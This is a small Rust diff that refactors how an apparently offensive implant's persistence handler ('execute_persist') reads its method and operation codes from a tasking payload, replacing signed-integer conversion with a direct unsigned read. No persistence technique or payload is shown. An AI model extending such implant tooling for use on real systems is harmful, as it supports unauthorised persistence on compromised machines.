@@ -36,13 +36,11 @@ pub(super) async fn execute_persist(
 ) -> Result<(), PhantomError> {
     let mut parser = TaskParser::new(payload);
 
-    let method_raw = u32::try_from(parser.int32()?)
-        .map_err(|_| PhantomError::TaskParse("negative persist method"))?;
+    let method_raw = parser.uint32()?;
     let method = PhantomPersistMethod::try_from(method_raw)
         .map_err(|_| PhantomError::TaskParse("unknown persist method"))?;
 
-    let op_raw = u32::try_from(parser.int32()?)
-        .map_err(|_| PhantomError::TaskParse("negative persist op"))?;
+    let op_raw = parser.uint32()?;
     let op = PhantomPersistOp::try_from(op_raw)
         .map_err(|_| PhantomError::TaskParse("unknown persist op"))?;
 
